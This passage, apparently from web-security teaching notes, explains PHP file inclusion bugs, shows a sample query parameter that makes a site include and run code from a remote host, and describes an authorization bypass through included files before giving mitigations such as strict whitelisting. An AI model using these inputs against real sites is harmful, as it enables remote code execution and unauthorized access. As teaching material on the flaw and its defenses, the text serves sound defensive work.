# FILE INCLUSION BUGS
Consider this URL: `http://example.com/index.php?page=home`. Changing the query to `?page=test` gives you the following error embedded in the page:
`Warning: include(test.php): failed to open stream: No such file or directory in - on line 26`
It seems to be calling the `include()` function on the page you reference + '`.php`'. If this can change what is on the server, it has a *file inclusion vulnerability*. What if we change the query to: 
`?page=http://demoseen.com/test`

Suddenly it's making a web request to `http://demoseen.com/test.php` --  any code that's contained in that file is going to be executed by the site in question. Including code on the fly based on user input without *very strict whitelisting* will very likely result in file inclusion bugs.
PHP (and other languages/frameworks) will in many cases be configured not to allow web requests from an `include()` and the like. When they are possible, you have **RFI** -- when they're not, you're looking at **LFI**.

Often applications written such that authorization checks happen in a different file than the actual logic. So, in this scenario, going to `?page=admin` might give you a login prompt for an admin area, but `?page=admin_users` might give you direct access to the user management component for instance.
### MITIGATION
The safest way to handle this is to *not* have user input driven into `include()` and the like *whatsoever*. This is the *only way to make sure this bug will not occur*.
Otherwise, **whitelisting is essential**. This should be *as strict as possible without restricting functionality, to prevent odd edge-cases*.
In the case that neither of these is viable, then *removing directory separators may be the only route*. This is **not recommended**, but will prevent URLs and directory traversal.
At this point, your filesystem is the effective whitelist, so it's rare that this is a good choice, but it does work. 
# FILE UPLOAD BUGS
